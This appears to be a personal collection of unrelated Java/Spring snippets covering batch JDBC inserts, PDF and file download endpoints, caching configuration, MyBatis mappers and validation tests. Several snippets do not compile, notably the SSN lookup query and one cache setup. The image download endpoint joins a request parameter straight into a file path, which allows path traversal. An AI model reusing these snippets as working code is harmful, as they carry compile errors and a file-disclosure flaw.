			+ " VALUES (?, ?)";

	/* We limit the number of records we process at a time to avoid too many parameters per query */		
	private static final Integer BATCH_SIZE = 500; 

	@Autowired
	@Qualifier("dataSource")
	private DataSource dataSource;

	@PostConstruct
	public void postConstruct() {
		setDataSource(dataSource);
	}
	
	@Override
	public int batchSave(Collection<MyEntity> records) {
		int count = 0;
		for(final List<MyEntity> batch : CollectionUtil.split(records, BATCH_SIZE)) {
			count += executeBatch(BATCH_INSERT_SQL, new BatchPreparedStatementSetter() {
			
				@Override
				public void setValues(PreparedStatement ps, int i) throws SQLException {
					MyEntity l = batch.get(i);
					ps.setString(1, l.getField1());
					ps.setString(2, l.getField2());
				}
				
				@Override
				public int getBatchSize() {
					return batch.size();
				}
			});
		}
		return count;
	}

}
--------------------------------------------------------------------------------------------------------
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.parseMediaType(mediaType));
  headers.setContentDispositionFormData("attachment", fileName);
  return new ResponseEntity<>(fileContent, headers, HttpStatus.OK);
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "/createReport", method = RequestMethod.POST,produces="application/pdf")
 @ResponseStatus(value = HttpStatus.OK)
 public ResponseEntity<byte[]> createReport(@RequestBody ReporteDTO reporteDTO) {
   byte[] outputReport = null;
   HttpHeaders headers = new HttpHeaders();
   headers.setContentType(MediaType.parseMediaType("application/pdf"));
   headers.setContentDispositionFormData("inline", "archivo.pdf");
   headers.setCacheControl("must-revalidate, post-check=0, pre-check=0");
      outputReport = getFilePdf();
   ResponseEntity<byte[]> response = new ResponseEntity<byte[]>(outputReport, headers, HttpStatus.OK);
   return response;
 }
 
 @RequestMapping(value = "/{id}/download", method = RequestMethod.GET)
public ResponseEntity<byte[]> download(@PathVariable String id) throws Exception {
  DocumentId documentId = new DocumentId(id);
  byte[] bytes = documentPdfService.generatePdf(documentId);
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.parseMediaType("application/pdf"));
  String filename = documentPdfService.getFileName(documentId);
  headers.setContentDispositionFormData(filename, filename);
  headers.setCacheControl("must-revalidate, post-check=0, pre-check=0");
  return new ResponseEntity<>(bytes, headers, HttpStatus.OK);
}
--------------------------------------------------------------------------------------------------------
/*
* Matches either on userId or lastName + last4 digits of SSN
*/
public List<User> findAllByUserIdOrLastNameLastFourSSN( List<UserParameter> parameters ) {
	  
	// setup the criteria API to query User
	CriteriaBuilder cBuilder = getEntityManager().getCriteriaBuilder();
	CriteriaQuery<User> criteriaQuery = cBuilder.createQuery(User.class);
	Root<User> root = criteriaQuery.from(User.class);
	criteriaQuery.select(root);

	// set up lists to store the userId or predicates to match lastName AND last 4 of ssn
	List<String> userIds = ArrayList<>();
	List<Predicate> nameAndSSNPredicates = new ArrayList<>();

	// Loop over parameters, adding predicates and parameters as needed
	int i = 0;
	for(UserParameter param : parameters) {
	  
	  if(null == param.getUserId) {
	    // match lastname + ssn with unique parameters
	    Predicate predicate = cBuilder.and(
	      ParameterExpression<String> lastNameParam = cBuilder.parameter(String.class, "lastName" + i);
				ParameterExpression<String> ssnParam = cBuilder.parameter(String.class, "ssn" + i);
				cBuilder.equal(root.get("lastName"), lastNameParam),
				cBuilder.equal( cBuilder.substring(root.get("ssn"), cBuilder.diff( cBuilder.length( root.get("ssn") ), 3), cBuilder.literal(4) ), ssnParam)
			);
			nameAndSSNPredicates.add(predicate);
	  } else {
	    // match to userId
	    userIds.add(param.getUserId);
	  }
	  
	}

	// Add userIds to list of predicates
	if(!userIds.isEmpty()) {
	  nameAndSSNPredicates.add(root.get("userId").in(userIds));
	}

	// seperate all generated predicates with an OR
	Predicate combinedPredicate = cBuilder.or(nameAndSSNPredicates.toArray(new Predicate[nameAndSSNPredicates.size()]));

	// Create Query and add parameters
	criteriaQuery.where(combinedPredicate);
	Query query = getEntityManager().createQuery(criteriaQuery);

	int x = 0;
	for(UserParameter param : parameters) {
	  if(null == param.getUserId) {
	  // only set parameters for lastname and ssn matches
	      query.setParameter("lastname" + x, param.getLastName());
	      
		  .setParameter("ssn" + x, param.getSsn());
	  } 
	  x++;
	}

	// run the query
	return query.getResultList();
		
}

select *
from User 
where
userId in (:userIds)
-- Then we need an OR clause for each match we want
OR ( lastName = :lastName1 AND SUBSTRING(ssn, LEN(ssn)-3, 4) = :lastFourSsn1)
OR ( lastName = :lastName2 AND SUBSTRING(ssn, LEN(ssn)-3, 4) = :lastFourSsn2)
-- ... 
--------------------------------------------------------------------------------------------------------\
Foo foo = new Foo();
fooService.create(foo);
fooService.findOne(foo.getId());
int size = CacheManager.ALL_CACHE_MANAGERS.get(0)
  .getCache("com.baeldung.hibernate.cache.model.Foo").getSize();
assertThat(size, greaterThan(0));
--------------------------------------------------------------------------------------------------------
  @Bean
    public Validator validator() {

        return new org.springframework.validation.beanvalidation.LocalValidatorFactoryBean();
    }
	
	@Bean
public javax.validation.Validator localValidatorFactoryBean() {
   return new LocalValidatorFactoryBean();
}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<ehcache name="in-memory" xmlns="http://ehcache.org/ehcache.xsd">
    <!--<diskStore path="java.io.tmpdir"/>-->

    <!--
        30d = 3600×24×30 = 2592000
    -->

    <cache name="org.hibernate.cache.internal.StandardQueryCache"
           maxElementsInMemory="9999" eternal="false"
           timeToIdleSeconds="2592000" timeToLiveSeconds="2592000"
           overflowToDisk="false" overflowToOffHeap="false"/>

    <cache name="org.hibernate.cache.spi.UpdateTimestampsCache"
           maxElementsInMemory="9999" eternal="true"
           overflowToDisk="false" overflowToOffHeap="false"/>

    <defaultCache maxElementsInMemory="9999" eternal="false"
                  timeToIdleSeconds="2592000" timeToLiveSeconds="2592000"
                  overflowToDisk="false" overflowToOffHeap="false"/>
</ehcache>
and hibernate.properties:

hibernate.jdbc.batch_size=20
hibernate.show_sql=true
hibernate.format_sql=true
hibernate.validator.autoregister_listeners=false
hibernate.cache.use_second_level_cache=true
hibernate.cache.use_query_cache=true
hibernate.cache.region.factory_class=org.hibernate.cache.ehcache.EhCacheRegionFactory
hibernate.hbm2ddl.auto=update
net.sf.ehcache.configurationResourceName=ehcache/ehcache-in-memory.xml
hibernate.dialect=org.hibernate.dialect.H2Dialect
and some versions from pom.xml for which my explanation applies:

<springframework.version>5.0.6.RELEASE</springframework.version>
<spring-security.version>5.0.5.RELEASE</spring-security.version>
<spring-data-jpa.version>2.1.0.RELEASE</spring-data-jpa.version>
<hibernate.version>5.2.13.Final</hibernate.version>
<jackson-datatype-hibernate5.version>2.9.4</jackson-datatype-hibernate5.version>
--------------------------------------------------------------------------------------------------------
@CacheEvict//(value = "servicesByCustomerId", key = "#p0.customer.id")
--------------------------------------------------------------------------------------------------------
 @Configuration
 @EnableCaching
 class CachingConfig {

   @Bean
   CacheManager cacheManager() {

     SimpleCacheManager cacheManager = new SimpleCacheManager();
     cacheManager.addCaches(Arrays.asList(new ConcurrentMapCache("servicesByCustomerId)));

     return cacheManager;
   }
 }
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;

import javax.cache.CacheManager;
import javax.cache.Caching;

import org.ehcache.config.CacheConfiguration;
import org.ehcache.config.ResourcePools;
import org.ehcache.config.builders.CacheConfigurationBuilder;
import org.ehcache.config.builders.ResourcePoolsBuilder;
import org.ehcache.config.units.EntryUnit;
import org.ehcache.config.units.MemoryUnit;
import org.ehcache.core.config.DefaultConfiguration;
import org.ehcache.jsr107.EhcacheCachingProvider;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.jcache.JCacheCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@EnableCaching
public class CacheConfig {


    @Bean
    public JCacheCacheManager jCacheCacheManager() {
        JCacheCacheManager jCacheManager = new JCacheCacheManager(cacheManager());
        return jCacheManager;
    }

    @Bean(destroyMethod = "close")
    public CacheManager cacheManager() {

        ResourcePools resourcePools = ResourcePoolsBuilder.newResourcePoolsBuilder()
                .heap(2000, EntryUnit.ENTRIES)
                .offheap(100, MemoryUnit.MB)
                .build();


        CacheConfiguration<Object,Object> cacheConfiguration = CacheConfigurationBuilder.newCacheConfigurationBuilder(
                Object.class,
                Object.class,
                resourcePools).
                build();

        Map<String, CacheConfiguration<?, ?>> caches = new HashMap<>();
        caches.put("myCache", cacheConfiguration);

        EhcacheCachingProvider provider = (EhcacheCachingProvider) Caching.getCachingProvider("org.ehcache.jsr107.EhcacheCachingProvider");
        org.ehcache.config.Configuration configuration = new DefaultConfiguration(caches, provider.getDefaultClassLoader());

        return  provider.getCacheManager(provider.getDefaultURI(), (org.ehcache.config.Configuration) configuration);
    }

}

spring.cache.cache-names=cache1,cache2
spring.cache.redis.time-to-live=600000

https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-caching.html
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.system.configuration;
//
//import org.springframework.cache.annotation.EnableCaching;
//import org.springframework.cache.jcache.JCacheCacheManager;
//import org.springframework.context.annotation.AdviceMode;
//import org.springframework.context.annotation.Bean;
//import org.springframework.context.annotation.Configuration;
//
//@Configuration
//@EnableCaching(mode = AdviceMode.ASPECTJ)
//public class CacheConfiguration {
//
//    @Bean
//    public JCacheCacheManager jCacheCacheManager() {
//        final JCacheCacheManager jCacheCacheManager = new JCacheCacheManager();
//        jCacheCacheManager.setTransactionAware(true);
//        jCacheCacheManager.afterPropertiesSet();
//        return jCacheCacheManager;
//    }
//
////    @Bean(destroyMethod = "close")
////    public CacheManager cacheManager() {
////        final org.ehcache.config.CacheConfiguration cacheConfiguration = CacheConfigurationBuilder
////                .newCacheConfigurationBuilder(Object.class, Object.class, ResourcePoolsBuilder.heap(5))
////                .build();
////
////        //final Map<String, org.ehcache.config.CacheConfiguration> caches = Collections.singletonMap("person", cacheConfiguration);
////        final EhcacheCachingProvider provider = (EhcacheCachingProvider) Caching.getCachingProvider();
////        final DefaultConfiguration configuration = new DefaultConfiguration(cacheConfiguration);
////        return provider.getCacheManager(provider.getDefaultURI(), configuration);
////    }
//
////    @Bean
////    @ConditionalOnMissingBean
////    public CacheManager jCacheCacheManager() throws IOException {
////        CacheManager jCacheCacheManager = createCacheManager();
////        List<String> cacheNames = this.cacheProperties.getCacheNames();
////        if (!CollectionUtils.isEmpty(cacheNames)) {
////            for (String cacheName : cacheNames) {
////                jCacheCacheManager.createCache(cacheName, getDefaultCacheConfiguration());
////            }
////        }
////        customize(jCacheCacheManager);
////        return jCacheCacheManager;
////    }
////    @Bean(destroyMethod = "close")
////    public CacheManager cacheManager() {
////
////        ResourcePools resourcePools = ResourcePoolsBuilder.newResourcePoolsBuilder()
////                .heap(2000, EntryUnit.ENTRIES)
////                .offheap(100, MemoryUnit.MB)
////                .build();
////
////
////        CacheConfiguration<Object,Object> cacheConfiguration = CacheConfigurationBuilder.newCacheConfigurationBuilder(
////                Object.class,
////                Object.class,
////                resourcePools).
////                build();
////
////        Map<String, CacheConfiguration<?, ?>> caches = new HashMap<>();
////        caches.put("myCache", cacheConfiguration);
////
////        EhcacheCachingProvider provider = (EhcacheCachingProvider) Caching.getCachingProvider("org.ehcache.jsr107.EhcacheCachingProvider");
////        org.ehcache.config.Configuration configuration = new DefaultConfiguration(caches, provider.getDefaultClassLoader());
////
////        return  provider.getCacheManager(provider.getDefaultURI(), (org.ehcache.config.Configuration) configuration);
////    }
//
////    @Bean(destroyMethod = "close")
////    public CacheManager cacheManager(final org.springframework.cache.ehcache.EhCacheCacheManager ehCacheCacheManager) {
////        final EhCacheCacheManager cacheManager = new EhCacheCacheManager();
////        cacheManager.setCacheManager(ehCacheCacheManager);
////        cacheManager.setTransactionAware(true);
////        return cacheManager;
////    }
//
////    @Bean
////    public CacheManager cacheManager() {
////        return new EhCacheCacheManager(ehCacheCacheManager().getObject());
////    }
////
////    @Bean
////    public EhCacheManagerFactoryBean ehCacheCacheManager() {
////        final EhCacheManagerFactoryBean cmfb = new EhCacheManagerFactoryBean();
////        cmfb.setConfigLocation(new ClassPathResource("ehcache.xml"));
////        cmfb.setShared(true);
////        return cmfb;
////    }
//
////    @Bean
////    public org.springframework.cache.CacheManager cacheManager(final org.ehcache.CacheManager cacheManager) {
////        final JCacheCacheManager jCacheCacheManager = new JCacheCacheManager();
////        jCacheCacheManager.setCacheManager(cacheManager);
////        jCacheCacheManager.setTransactionAware(true);
////        jCacheCacheManager.afterPropertiesSet();
////        return jCacheCacheManager;
////    }
//
////    @Bean
////    public org.springframework.cache.CacheManager cacheManager(final EhCacheManagerFactoryBean cacheManagerFactory) {
////        final JCacheCacheManager jCacheCacheManager = new JCacheCacheManager(cacheManagerFactory.getObject());
////        jCacheCacheManager.setTransactionAware(true);
////        jCacheCacheManager.afterPropertiesSet();
////        return jCacheCacheManager;
////    }
////
////    @Bean(destroyMethod = "destroy")
////    public EhCacheManagerFactoryBean cacheManagerFactory() {
////        final EhCacheManagerFactoryBean bean = new EhCacheManagerFactoryBean();
////        //bean.setConfigLocation(new ClassPathResource(env.getProperty("triggers.datasource.config.hibernate.cache.configurationResourceName")));
////        bean.setShared(true);
////        bean.afterPropertiesSet();
////        return bean;
////    }
//}
--------------------------------------------------------------------------------------------------------
@SuppressWarnings("checkstyle:classdataabstractioncoupling")
--------------------------------------------------------------------------------------------------------
public class CacheHelper {
 
    private CacheManager cacheManager;
    private Cache<Integer, Integer> squareNumberCache;
 
    public CacheHelper() {
        cacheManager = CacheManagerBuilder
          .newCacheManagerBuilder().build();
        cacheManager.init();
 
        squareNumberCache = cacheManager
          .createCache("squaredNumber", CacheConfigurationBuilder
            .newCacheConfigurationBuilder(
              Integer.class, Integer.class,
              ResourcePoolsBuilder.heap(10)));
    }
 
    public Cache<Integer, Integer> getSquareNumberCacheFromCacheManager() {
        return cacheManager.getCache("squaredNumber", Integer.class, Integer.class);
    }
     
    // standard getters and setters
}
--------------------------------------------------------------------------------------------------------
interface PromotionServiceXrefRepository extends PagingAndSortingRepository<PromotionServiceXref, Integer> {

  @Query("…")
  @Cacheable("servicesByCustomerId")
  Set<PromotionServiceXref> findByCustomerId(int customerId);

  @Override
  @CacheEvict(value = "servicesByCustomerId", key = "#p0.customer.id")
  <S extends PromotionServiceXref> S save(S service);
}
--------------------------------------------------------------------------------------------------------
	/**
	 * 下载
	 * @param file 文件
	 * @param fileName 生成的文件名
	 * @return {ResponseEntity}
	 */
	protected ResponseEntity<Resource> download(File file, String fileName) {
		Resource resource = new FileSystemResource(file);
		
		HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder
				.getRequestAttributes()).getRequest();
		String header = request.getHeader("User-Agent");
		// 避免空指针
		header = header == null ? "" : header.toUpperCase();
		HttpStatus status;
		if (header.contains("MSIE") || header.contains("TRIDENT") || header.contains("EDGE")) {
			fileName = URLUtils.encodeURL(fileName, Charsets.UTF_8);
			status = HttpStatus.OK;
		} else {
			fileName = new String(fileName.getBytes(Charsets.UTF_8), Charsets.ISO_8859_1);
			status = HttpStatus.CREATED;
		}
		HttpHeaders headers = new HttpHeaders();
		headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
		headers.setContentDispositionFormData("attachment", fileName);
		return new ResponseEntity<Resource>(resource, headers, status);
	}
--------------------------------------------------------------------------------------------------------
    @PostMapping("/login")
    @CsrfToken(remove = true)
    @ResponseBody
--------------------------------------------------------------------------------------------------------
import com.baomidou.mybatisplus.mapper.BaseMapper;
import com.ikm.xmanager.cms.model.RoleResource;
import org.apache.ibatis.annotations.Delete;
import org.apache.ibatis.annotations.Param;
import org.apache.ibatis.annotations.Select;

import java.io.Serializable;

/**
 *
 * RoleResource 表数据库控制层接口
 *
 */
public interface RoleResourceMapper extends BaseMapper<RoleResource> {

    @Select("SELECT e.id AS id FROM role r LEFT JOIN role_resource e ON r.id = e.role_id WHERE r.id = #{id}")
    Long selectIdListByRoleId(@Param("id") Long id);

    @Delete("DELETE FROM role_resource WHERE resource_id = #{resourceId}")
    int deleteByResourceId(@Param("resourceId") Serializable resourceId);

}

import com.baomidou.mybatisplus.mapper.BaseMapper;
import com.ikm.xmanager.cms.model.UserRole;
import org.apache.ibatis.annotations.Delete;
import org.apache.ibatis.annotations.Param;
import org.apache.ibatis.annotations.ResultType;
import org.apache.ibatis.annotations.Select;

import java.util.List;

/**
 *
 * UserRole 表数据库控制层接口
 *
 */
public interface UserRoleMapper extends BaseMapper<UserRole> {

    List<UserRole> selectByUserId(@Param("userId") Long userId);

    @Select("select role_id AS roleId from user_role where user_id = #{userId}")
    @ResultType(Long.class)
    List<Long> selectRoleIdListByUserId(@Param("userId") Long userId);

    @Delete("DELETE FROM user_role WHERE user_id = #{userId}")
    int deleteByUserId(@Param("userId") Long userId);

}
--------------------------------------------------------------------------------------------------------
    /**
     * 未授权
     * @return {String}
     */
    @GetMapping("/unauth")
    public String unauth() {
        if (SecurityUtils.getSubject().isAuthenticated() == false) {
            return "redirect:/login";
        }
        return "unauth";
    }
--------------------------------------------------------------------------------------------------------
import com.ikm.xmanager.cms.service.ISysLogService;
import com.ikm.xmanager.commons.result.PageInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;


/**
 * @description：日志管理
 * @author：zhixuan.wang
 * @date：2015/10/30 18:06
 */
@Controller
@RequestMapping("/sysLog")
public class SysLogController {
    @Autowired
    private ISysLogService sysLogService;

    @GetMapping("/manager")
    public String manager() {
        return "admin/syslog";
    }

    @PostMapping("/dataGrid")
    @ResponseBody
    public PageInfo dataGrid(Integer page, Integer rows, 
            @RequestParam(value = "sort", defaultValue = "create_time") String sort, 
            @RequestParam(value = "order", defaultValue = "DESC") String order) {
        PageInfo pageInfo = new PageInfo(page, rows, sort, order);
        sysLogService.selectDataGrid(pageInfo);
        return pageInfo;
    }
}
--------------------------------------------------------------------------------------------------------
Map<String, Object> hookMap = JsonUtils.parse(hook, Map.class);

public <T> Page<T> getPage(int current, int size, String sort, String order){
    Page<T> page = new Page<T>(current, size, sort);
    if ("desc".equals(order)) {
        page.setAsc(false);
    } else {
        page.setAsc(true);
    }
    return page;
}
--------------------------------------------------------------------------------------------------------
public class FileSizeExample 
{
    public static void main(String[] args)
    {	
		File file =new File("c:\\java_xml_logo.jpg");
		
		if(file.exists()){
			
			double bytes = file.length();
			double kilobytes = (bytes / 1024);
			double megabytes = (kilobytes / 1024);
			double gigabytes = (megabytes / 1024);
			double terabytes = (gigabytes / 1024);
			double petabytes = (terabytes / 1024);
			double exabytes = (petabytes / 1024);
			double zettabytes = (exabytes / 1024);
			double yottabytes = (zettabytes / 1024);
			
			System.out.println("bytes : " + bytes);
			System.out.println("kilobytes : " + kilobytes);
			System.out.println("megabytes : " + megabytes);
			System.out.println("gigabytes : " + gigabytes);
			System.out.println("terabytes : " + terabytes);
			System.out.println("petabytes : " + petabytes);
			System.out.println("exabytes : " + exabytes);
			System.out.println("zettabytes : " + zettabytes);
			System.out.println("yottabytes : " + yottabytes);
		}else{
			 System.out.println("File does not exists!");
		}
    		
    }
}
--------------------------------------------------------------------------------------------------------
//    private StreamingResponseBody toStreaming(final InputStream command) {
//        return outputStream -> {
//            final Observable<InputStream> stream = command.toObservable();
//            stream.toBlocking().subscribe(inputStream -> {
//                try {
//                    IOUtils.copyLarge(inputStream, outputStream);
//                    outputStream.flush();
//                } catch (IOException e) {
//                    try {
//                        inputStream.close();
//                    } catch (IOException closingException) {
//                        log.warn("could not close command result, a http connection may be leaked !", closingException);
//                    }
//                    log.error("Unable to fully copy command result '{}'.", command.getClass(), e);
//                }
//            }, TDPException::rethrowOrWrap);
//        };
//    }
--------------------------------------------------------------------------------------------------------
public class ClassValidationMvcTest {
  private MockMvc mockMvc;
     
    @Before
    public void setup(){
        this.mockMvc = MockMvcBuilders
          .standaloneSetup(new NewUserController()).build();
    }
     
    @Test
    public void givenMatchingEmailPassword_whenPostNewUserForm_thenOk() 
      throws Exception {
        this.mockMvc.perform(MockMvcRequestBuilders
          .post("/user")
          .accept(MediaType.TEXT_HTML).
          .param("email", "john@yahoo.com")
          .param("verifyEmail", "john@yahoo.com")
          .param("password", "pass")
          .param("verifyPassword", "pass"))
          .andExpect(model().errorCount(0))
          .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@GetMapping(value = "/image", produces = "image/png")
public ResponseEntity<StreamingResponseBody> image() {
    BufferedImage canvas = service.createImage();

    StreamingResponseBody stream = outputStream ->
            ImageIO.write(canvas, "png", outputStream);

    return ResponseEntity.ok()
        .contentType(MediaType.IMAGE_PNG)
        .body(stream);
}


https://auth0.com/blog/automatically-mapping-dto-to-entity-on-spring-boot-apis/

@DateTimeFormat(iso = DateTimeFormat.ISO.DATE)
@JsonFormat(pattern = "MM/dd/yyyy")
private LocalDate startDate;

@JsonDeserialize(using = DateDeSerializer .class)
 private Date startDate;
 
 public class DateDeSerializer extends StdDeserializer<Date> {

    public DateDeSerializer() {
        super(Date.class);
    }

    @Override
    public Date deserialize(JsonParser p, DeserializationContext ctxt)
        throws IOException, JsonProcessingException {
        String value = p.readValueAs(String.class);
        try {
            return new SimpleDateFormat("MM/dd/yyyy").parse(value);
        } catch (DateTimeParseException e) {
            //throw an error
        }
    }

}
--------------------------------------------------------------------------------------------------------
spring.jpa.properties.javax.persistence.schema-generation.create-source=metadata
spring.jpa.properties.javax.persistence.schema-generation.scripts.action=create
spring.jpa.properties.javax.persistence.schema-generation.scripts.create-target=create.sql
--------------------------------------------------------------------------------------------------------
        try (ObjectOutputStream oos = new ObjectOutputStream(new GZIPOutputStream(outputStream))) {
            oos.writeObject(result);
        }
--------------------------------------------------------------------------------------------------------
uuidgen | grep -E "[A-F0-9]{8}-[A-F0-9]{4}-4[A-F0-9]{3}-[89AB][A-F0-9]{3}-[A-F0-9]{12}"
/[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}/

@GetMapping("/file/{id:[a-f0-9]{64}}/{key:[a-f0-9]{64}}")

UUID v1 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[1][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v2 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[2][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v3 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[3][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v4 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v5 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[5][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
--------------------------------------------------------------------------------------------------------
@RequestMapping(path = "config", method = RequestMethod.GET)
public ResponseEntity<StreamingResponseBody> getConfig() {
    HttpHeaders headers = new HttpHeaders();
    // 'produces' in annotation does not work with stream
    headers.setContentType(MediaType.APPLICATION_JSON);
    headers.set(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"cluman_config.json\"");
    return new ResponseEntity<>((os) -> {
        appConfigService.write(MimeTypeUtils.APPLICATION_JSON_VALUE, os);
    }, headers, HttpStatus.OK);
}
--------------------------------------------------------------------------------------------------------
import org.springframework.core.io.ByteArrayResource;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

@RestController
@RequestMapping("/app")
public class ImageResource {

    private static final String EXTENSION = ".jpg";
    private static final String SERVER_LOCATION = "/server/images";

    @RequestMapping(path = "/download", method = RequestMethod.GET)
    public ResponseEntity<Resource> download(@RequestParam("image") String image) throws IOException {
        File file = new File(SERVER_LOCATION + File.separator + image + EXTENSION);

        HttpHeaders header = new HttpHeaders();
        header.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=img.jpg");
        header.add("Cache-Control", "no-cache, no-store, must-revalidate");
        header.add("Pragma", "no-cache");
        header.add("Expires", "0");

        Path path = Paths.get(file.getAbsolutePath());
        ByteArrayResource resource = new ByteArrayResource(Files.readAllBytes(path));

        return ResponseEntity.ok()
                .headers(header)
                .contentLength(file.length())
                .contentType(MediaType.parseMediaType("application/octet-stream"))
                .body(resource);
    }

}
--------------------------------------------------------------------------------------------------------
Content-Disposition: inline
Content-Disposition: attachment
Content-Disposition: attachment; filename="java-tutorial.pdf"
--------------------------------------------------------------------------------------------------------
@PostMapping("/")
@ResponseBody
ResponseEntity<StreamingResponseBody> post(@RequestPart final MultipartFile file)
        throws Exception {

    if (file.isEmpty()) {
        throw new ValidationException("file was empty");
    }

    final HttpHeaders headers = new HttpHeaders();
    headers.setContentDispositionFormData("filename", "sample.txt");

    final StreamingResponseBody body = out -> out.write(file.getBytes());

    return ResponseEntity.ok()
            .headers(headers)
            .contentType(MediaType.valueOf("application/force-download"))
            .body(body);
}
--------------------------------------------------------------------------------------------------------
@ManagementContextConfiguration public class MappingsEndpointAutoConfiguration { @Bean @ConditionalOnEnabledEndpoint public MappingsEndpoint mappingsEndpoint(ApplicationContext applicationContext, ObjectProvider<Collection<MappingDescriptionProvider>> descriptionProviders) { return new MappingsEndpoint( descriptionProviders.getIfAvailable(Collections::emptyList), applicationContext); } @Configuration @ConditionalOnWebApplication(type = Type.SERVLET) static class ServletWebConfiguration { @Bean ServletsMappingDescriptionProvider servletMappingDescriptionProvider() { return new ServletsMappingDescriptionProvider(); } @Bean FiltersMappingDescriptionProvider filterMappingDescriptionProvider() { return new FiltersMappingDescriptionProvider(); } @Configuration @ConditionalOnClass(DispatcherServlet.class) @ConditionalOnBean(DispatcherServlet.class) static class SpringMvcConfiguration { @Bean DispatcherServletsMappingDescriptionProvider dispatcherServletMappingDescriptionProvider() { return new DispatcherServletsMappingDescriptionProvider(); } } } @Configuration @ConditionalOnWebApplication(type = Type.REACTIVE) @ConditionalOnClass(DispatcherHandler.class) @ConditionalOnBean(DispatcherHandler.class) static class ReactiveWebConfiguration { @Bean public DispatcherHandlersMappingDescriptionProvider dispatcherHandlerMappingDescriptionProvider( ApplicationContext applicationContext) { return new DispatcherHandlersMappingDescriptionProvider(); } } }


作者：go4it
链接：https://juejin.im/post/5adeeeb16fb9a07aae14d060
来源：掘金
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
--------------------------------------------------------------------------------------------------------
@ConditionalOnProperty(name="user.endpoint", havingValue = “mock”,  matchIfMissing = false)

public MyBean condition1() {}

 

@ConditionalOnProperty(name="user.endpoint", havingValue = “mock”,  matchIfMissing = true)

public MyBean condition2() {}
--------------------------------------------------------------------------------------------------------
curl -X PUT \
  http://localhost:8080/company/ \
  -H 'content-type: application/json' \
  -d '{
 "id": 8,
    "name": "FantaUpdated"
}'

curl -X POST \
  http://localhost:8080/company \
  -H 'content-type: application/json' \
  -d '{
    "name": "7up",
    "departments": [
        {
            "name": "Administrative Accounting",
            "employees": [
                {
                    "name": "Jim",
                    "surname": "Lahey"
                }
            ]
        }
    ]
}'
--------------------------------------------------------------------------------------------------------

import java.beans.PropertyChangeListener;
import java.beans.PropertyChangeSupport;
import java.io.Serializable;

import javax.annotation.concurrent.GuardedBy;
import javax.annotation.concurrent.ThreadSafe;

import com.mysema.query.annotations.QueryExclude;

@ThreadSafe
@QueryExclude
public abstract class APropertyChangeSupported implements Comparable<Object>, Cloneable, Serializable {

    private static final long serialVersionUID = 1L;

    private transient PropertyChangeSupport propertyChangeSupport;

    private synchronized PropertyChangeSupport lazyGetPropertyChangeSupport(final boolean initializeIfNull) {
        if (initializeIfNull && propertyChangeSupport == null) {
            propertyChangeSupport = new PropertyChangeSupport(this);
        }
        return propertyChangeSupport;
    }

    public final void addPropertyChangeListener(final PropertyChangeListener listener) {
        if (listener != null) {
            lazyGetPropertyChangeSupport(true).addPropertyChangeListener(listener);
        }
    }

    public final void addPropertyChangeListener(final String property, final PropertyChangeListener listener) {
        if (listener != null) {
            lazyGetPropertyChangeSupport(true).addPropertyChangeListener(property, listener);
        }
    }

    public final void removePropertyChangeListener(final PropertyChangeListener listener) {
        final PropertyChangeSupport ref = lazyGetPropertyChangeSupport(false);
        if (ref != null) {
            ref.removePropertyChangeListener(listener);
        }
    }

    public final void removePropertyChangeListener(final String property, final PropertyChangeListener listener) {
        final PropertyChangeSupport ref = lazyGetPropertyChangeSupport(false);
        if (ref != null) {
            ref.removePropertyChangeListener(property, listener);
        }
    }

    public final boolean hasListeners(final String propertyName) {
        final PropertyChangeSupport ref = lazyGetPropertyChangeSupport(false);
        return ref != null && ref.hasListeners(propertyName);
    }

    protected final void fireIndexedPropertyChange(final String propertyName, final int index, final Object oldValue,
            final Object newValue) {
        final PropertyChangeSupport ref = lazyGetPropertyChangeSupport(false);
        if (ref != null) {
            ref.fireIndexedPropertyChange(propertyName, index, oldValue, newValue);
        }
    }

    protected final void firePropertyChange(final String propertyName, final Object oldValue, final Object newValue) {
        final PropertyChangeSupport ref = lazyGetPropertyChangeSupport(false);
        if (ref != null) {
            ref.firePropertyChange(propertyName, oldValue, newValue);
        }
    }
}
--------------------------------------------------------------------------------------------------------
cubejs create hello-world -d postgres
